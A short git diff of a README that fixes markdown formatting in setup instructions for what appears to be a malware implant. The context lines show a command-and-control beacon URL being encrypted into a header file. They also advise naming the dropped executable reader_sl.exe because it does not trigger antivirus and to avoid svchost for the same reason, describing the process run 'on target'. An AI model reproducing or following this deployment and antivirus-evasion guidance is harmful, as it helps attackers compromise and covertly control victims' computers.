@@ -82,7 +82,8 @@ touch session
 ```
 - go back to domain (cd ..) folder and run command
 
-```mkdir static-files
+```
+mkdir static-files
 ```
 
 - go inside folder static-files run this command:
@@ -195,9 +196,9 @@ S("http://my.domain.com/cgi-bin/noop?id=")
 
 and copy encrypted string to the right location at common.h so it looks like:
 
-
+```
 #define REQUEST_NOOP L"\x5c\x5b ..."
-
+```
 
 - MAIN_FILENAME is the name of the file that will be created and run, reader_sl.exe is great since it does not trigger AV and is used everywhere. This is the name of the new process after running the exe on target. If you use svchost etc it might trigger AV so be careful.
 
